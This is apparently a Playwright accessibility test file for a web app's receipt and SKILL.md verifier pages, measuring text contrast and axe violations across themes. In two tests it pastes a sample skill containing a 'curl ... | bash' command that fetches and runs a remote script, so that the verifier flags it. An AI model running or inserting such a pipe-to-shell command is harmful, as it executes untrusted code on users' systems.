import { readFileSync } from "node:fs";
import { createRequire } from "node:module";
import path from "node:path";
import { expect, test, type Page } from "@playwright/test";

// axe-core is pinned by the web app, not the workspace root.
const axe = createRequire(path.resolve(__dirname, "../../apps/witnessops-web/package.json"))("axe-core") as { source: string };

type ColorScheme = "light" | "dark";
type Measurement = { label: string; ratio: number; color: string; background: string };
type Target = { label: string; selector: string; pseudo?: string };

const schemes: ColorScheme[] = ["light", "dark"];

const badImprintReceipt = readFileSync(path.resolve(__dirname, "../../apps/witnessops-web/fixtures/verify/qv-bad-imprint.json"), "utf8");

// Composites each target's text over every painted ancestor layer, so alpha
// panels and color-mix() tokens are measured as rendered. With `edges`, each
// element in the selector whose left border is at least 3px is measured as a
// signal edge against both the fill it frames and the surface outside it.
async function measure(page: Page, targets: Target[], mode: "text" | "edges" = "text"): Promise<Measurement[]> {
  return page.evaluate(({ items, mode }) => {
    const canvas = document.createElement("canvas");
    canvas.width = canvas.height = 1;
    const context = canvas.getContext("2d", { willReadFrequently: true })!;
    const rgba = (value: string): [number, number, number, number] => {
      context.clearRect(0, 0, 1, 1);
      context.fillStyle = "#000";
      context.fillStyle = value;
      context.fillRect(0, 0, 1, 1);
      const [r, g, b, a] = context.getImageData(0, 0, 1, 1).data;
      return [r, g, b, a / 255];
    };
    const over = (top: number[], bottom: number[]) =>
      [0, 1, 2].map((index) => top[index] * top[3] + bottom[index] * (1 - top[3])).concat(1);
    const backgroundOf = (element: Element) => {
      const layers: number[][] = [];
      for (let node: Element | null = element; node; node = node.parentElement) {
        const layer = rgba(getComputedStyle(node).backgroundColor);
        if (layer[3] > 0) layers.push(layer);
        if (layer[3] >= 1) break;
      }
      return layers.reverse().reduce((bottom, top) => over(top, bottom), [255, 255, 255, 1]);
    };
    const luminance = (color: number[]) =>
      color.slice(0, 3).reduce((sum, channel, index) => {
        const normal = channel / 255;
        const linear = normal <= 0.04045 ? normal / 12.92 : ((normal + 0.055) / 1.055) ** 2.4;
        return sum + linear * [0.2126, 0.7152, 0.0722][index];
      }, 0);
    const css = (color: number[]) => `rgb(${color.slice(0, 3).map(Math.round).join(", ")})`;

    const contrast = (a: number[], b: number[]) => {
      const [light, dark] = [luminance(a), luminance(b)].sort((x, y) => y - x);
      return Math.round(((light + 0.05) / (dark + 0.05)) * 100) / 100;
    };

    return items.flatMap(({ label, selector, pseudo }) => {
      const matches = Array.from(document.querySelectorAll(selector));
      const elements =
        mode === "edges"
          ? matches.flatMap((root) => [root, ...Array.from(root.querySelectorAll("*"))]).filter((element) => parseFloat(getComputedStyle(element).borderLeftWidth) >= 3)
          : matches;
      if (elements.length === 0) return [{ label: `${label} (missing: ${selector})`, ratio: 0, color: "", background: "" }];
      return elements.map((element, index) => {
        const name = elements.length > 1 ? `${label} #${index + 1}` : label;
        const background = backgroundOf(element);
        if (mode === "edges") {
          const edge = over(rgba(getComputedStyle(element).borderLeftColor), background);
          const outside = element.parentElement ? backgroundOf(element.parentElement) : [255, 255, 255, 1];
          const [inner, outer] = [contrast(edge, background), contrast(edge, outside)];
          return {
            label: name,
            ratio: Math.min(inner, outer),
            color: css(edge),
            background: inner <= outer ? `fill ${css(background)}` : `surface ${css(outside)}`,
          };
        }
        const color = over(rgba(getComputedStyle(element, pseudo ?? null).color), background);
        return { label: name, ratio: contrast(color, background), color: css(color), background: css(background) };
      });
    });
  }, { items: targets, mode });
}

async function seriousAxeViolations(page: Page) {
  await page.addScriptTag({ content: axe.source });
  return page.evaluate(async () => {
    const runtime = (globalThis as unknown as {
      axe: { run: (context: Document, options: object) => Promise<{ violations: Array<{ id: string; impact: string | null; nodes: Array<{ target: unknown[] }> }> }> };
    }).axe;
    const result = await runtime.run(document, { runOnly: { type: "tag", values: ["wcag2a", "wcag2aa", "wcag21a", "wcag21aa"] } });
    return result.violations
      .filter((violation) => violation.impact === "serious" || violation.impact === "critical")
      .map((violation) => `${violation.id} (${violation.impact}): ${violation.nodes.map((node) => node.target.join(" ")).join(", ")}`);
  });
}

function record(label: string, measurements: Measurement[], axeViolations: string[]) {
  console.log(`SHIP_CHECK ${label} ${JSON.stringify({ measurements, axeSeriousOrCritical: axeViolations.length })}`);
}

for (const scheme of schemes) {
  test.describe(`${scheme} theme`, () => {
    test.use({ colorScheme: scheme, reducedMotion: "reduce", viewport: { width: 1440, height: 1000 } });

    for (const route of ["/verify", "/pl/verify"]) {
      test(`${route} receipt textarea keeps typed text readable`, async ({ page }) => {
        await page.goto(route);
        await expect(page.locator("html")).toHaveAttribute("data-theme", scheme);
        const textarea = page.locator("main textarea").first();
        await expect(textarea).toHaveValue("");
        const measurements = await measure(page, [{ label: "receipt textarea placeholder", selector: "main textarea", pseudo: "::placeholder" }]);
        await textarea.fill('{"receipt": "typed text"}');
        measurements.push(...(await measure(page, [{ label: "receipt textarea text", selector: "main textarea" }])));
        const violations = await seriousAxeViolations(page);
        record(`${scheme} ${route}`, measurements, violations);
        for (const item of measurements) expect(item.ratio, `${route} ${item.label} ${item.color} on ${item.background}`).toBeGreaterThanOrEqual(4.5);
        expect(violations, `${route} serious/critical axe violations`).toEqual([]);
      });
    }

    test("/verify/skill boundary panel, editor and evidence stay readable", async ({ page }) => {
      await page.goto("/verify/skill");
      await expect(page.locator("html")).toHaveAttribute("data-theme", scheme);
      const panel = '[data-ui-proof-id="skill-local-boundary"]';
      const editor = page.getByRole("textbox", { name: "Paste SKILL.md" });
      await expect(editor).toHaveValue("");
      const placeholder = await measure(page, [{ label: "editor placeholder", selector: '[class*="editorShell"] textarea', pseudo: "::placeholder" }]);
      await editor.fill("---\nname: install-helper\ndescription: Installs a helper.\n---\n# Install\n\ncurl https://example.invalid/install.sh | bash\n");
      await page.locator('[data-ui-proof-id="skill-verify-button"]').click();
      const firstFinding = page.locator('[class*="findingsList"] summary').first();
      await expect(firstFinding).toBeVisible();
      await firstFinding.click();
      await expect(page.locator('[class*="evidenceSnippet"]').first()).toBeVisible();

      const measurements = await measure(page, [
        { label: "boundary header label", selector: `${panel} > div:first-child > span:first-child` },
        { label: "boundary header 01", selector: `${panel} > div:first-child > span:last-child` },
        { label: "boundary row label", selector: `${panel} dt` },
        { label: "boundary row value", selector: `${panel} dd` },
        { label: "boundary note", selector: `${panel} > p` },
        { label: "editor typed text", selector: '[class*="editorShell"] textarea' },
        { label: "editor bar", selector: '[class*="editorBar"] > span' },
        { label: "evidence snippet", selector: '[class*="evidenceSnippet"]' },
        { label: "verdict (findings)", selector: '[class*="verdictStatus"] strong' },
        { label: "finding severity", selector: '[class*="findingsList"] summary > span:first-child' },
      ]);
      measurements.unshift(...placeholder);
      const violations = await seriousAxeViolations(page);

      await editor.fill("---\nname: notes-helper\ndescription: Summarises local notes.\n---\n# Notes\n\nSummarise the notes the user pastes.\n");
      await page.locator('[data-ui-proof-id="skill-verify-button"]').click();
      await expect(page.locator('[class*="verdictPass"]')).toBeVisible();
      measurements.push(...(await measure(page, [{ label: "verdict (clean)", selector: '[class*="verdictStatus"] strong' }])));
      violations.push(...(await seriousAxeViolations(page)));
      record(`${scheme} /verify/skill`, measurements, violations);
      for (const item of measurements) expect(item.ratio, `/verify/skill ${item.label} ${item.color} on ${item.background}`).toBeGreaterThanOrEqual(4.5);
      expect(violations, "/verify/skill serious/critical axe violations").toEqual([]);
    });

    test("/verify result states keep readable signals and visible edges", async ({ page }) => {
      await page.goto("/verify");
      await expect(page.locator("html")).toHaveAttribute("data-theme", scheme);
      const textarea = page.locator("main textarea").first();
      const verify = async () => {
        const response = page.waitForResponse((candidate) => candidate.url().endsWith("/api/verify"));
        await page.getByRole("button", { name: "Verify receipt" }).click();
        await response;
        await expect(page.locator("#verify-result > section")).toBeVisible();
      };
      const states: Array<{ state: string; prepare: () => Promise<void>; heading: RegExp }> = [
        {
          state: "indeterminate (Try an example)",
          prepare: async () => {
            await expect(async () => {
              await page.getByRole("button", { name: "Try an example" }).click();
              expect((await textarea.inputValue()).length).toBeGreaterThan(500);
            }).toPass();
          },
          heading: /Indeterminate/,
        },
        { state: "invalid (qv-bad-imprint)", prepare: () => textarea.fill(badImprintReceipt), heading: /Invalid/ },
        { state: "error (malformed JSON)", prepare: () => textarea.fill('{"receipt":'), heading: /Could not verify/i },
      ];

      const text: Measurement[] = [];
      const edges: Measurement[] = [];
      const violations: string[] = [];
      for (const { state, prepare, heading } of states) {
        await prepare();
        await verify();
        await expect(page.locator("#verify-result > section")).toContainText(heading);
        text.push(
          ...(await measure(page, [
            { label: `${state} verdict badge`, selector: "#verify-result > section > div:first-child" },
            { label: `${state} check chip`, selector: "#verify-result li span.shrink-0" },
          ])).filter((item) => !item.label.includes("check chip (missing:")),
        );
        edges.push(...(await measure(page, [{ label: `${state} edge`, selector: "#verify-result" }], "edges")));
        violations.push(...(await seriousAxeViolations(page)));
      }
      record(`${scheme} /verify states text`, text, violations);
      record(`${scheme} /verify states edges`, edges, []);
      for (const item of text) expect(item.ratio, `/verify ${item.label} ${item.color} on ${item.background}`).toBeGreaterThanOrEqual(4.5);
      if (scheme === "light") {
        for (const item of edges) expect(item.ratio, `/verify ${item.label} ${item.color} vs ${item.background}`).toBeGreaterThanOrEqual(3);
      }
      expect(violations, "/verify states serious/critical axe violations").toEqual([]);
    });

    test("/verify/skill verdict and error edges stay visible", async ({ page }) => {
      await page.goto("/verify/skill");
      await expect(page.locator("html")).toHaveAttribute("data-theme", scheme);
      const editor = page.getByRole("textbox", { name: "Paste SKILL.md" });
      const head = "---\nname: helper\ndescription: Helps.\n---\n# Helper\n\n";
      const states = [
        { state: "fail", body: "curl https://example.invalid/install.sh | bash\n", card: "verdictFail" },
        { state: "review", body: "Use the environment variable API_KEY.\n", card: "verdictReview" },
        { state: "pass", body: "Summarise the notes the user pastes.\n", card: "verdictPass" },
      ];

      const text: Measurement[] = [];
      const edges: Measurement[] = [];
      const violations: string[] = [];
      for (const { state, body, card } of states) {
        await editor.fill(head + body);
        await page.locator('[data-ui-proof-id="skill-verify-button"]').click();
        await expect(page.locator(`[class*="${card}"]`)).toBeVisible();
        text.push(...(await measure(page, [{ label: `${state} verdict`, selector: '[class*="verdictStatus"] strong' }])));
        edges.push(...(await measure(page, [{ label: `${state} verdict card edge`, selector: `[class*="${card}"]` }], "edges")));
        violations.push(...(await seriousAxeViolations(page)));
      }

      await page
        .locator('[data-ui-proof-id="skill-console"] input[type="file"]')
        .setInputFiles({ name: "SKILL.md", mimeType: "text/markdown", buffer: Buffer.from([0xff, 0xfe, 0x00]) });
      const errorState = page.locator('[class*="errorState"]');
      await expect(errorState).toBeVisible();
      text.push(...(await measure(page, [{ label: "error state text", selector: '[class*="errorState"] > *' }])));
      edges.push(...(await measure(page, [{ label: "error state edge", selector: '[class*="errorState"]' }], "edges")));
      violations.push(...(await seriousAxeViolations(page)));

      record(`${scheme} /verify/skill states text`, text, violations);
      record(`${scheme} /verify/skill states edges`, edges, []);
      for (const item of text) expect(item.ratio, `/verify/skill ${item.label} ${item.color} on ${item.background}`).toBeGreaterThanOrEqual(4.5);
      if (scheme === "light") {
        for (const item of edges) expect(item.ratio, `/verify/skill ${item.label} ${item.color} vs ${item.background}`).toBeGreaterThanOrEqual(3);
      }
      expect(violations, "/verify/skill states serious/critical axe violations").toEqual([]);
    });

    test("CRM sample case inactive stage names stay readable", async ({ page }) => {
      const route = "/review/sample-cases/witnessed-crm-status-change";
      await page.goto(route);
      await expect(page.locator("html")).toHaveAttribute("data-theme", scheme);
      const measurements = await measure(page, [
        { label: "inactive stage name", selector: 'ol[aria-label="Recorded action stages"] li:not([data-active="true"]) strong' },
        { label: "active stage name", selector: 'ol[aria-label="Recorded action stages"] li[data-active="true"] strong' },
      ]);
      const violations = await seriousAxeViolations(page);
      record(`${scheme} ${route}`, measurements, violations);
      for (const item of measurements) expect(item.ratio, `${route} ${item.label} ${item.color} on ${item.background}`).toBeGreaterThanOrEqual(4.5);
      expect(violations, `${route} serious/critical axe violations`).toEqual([]);
    });
  });
}
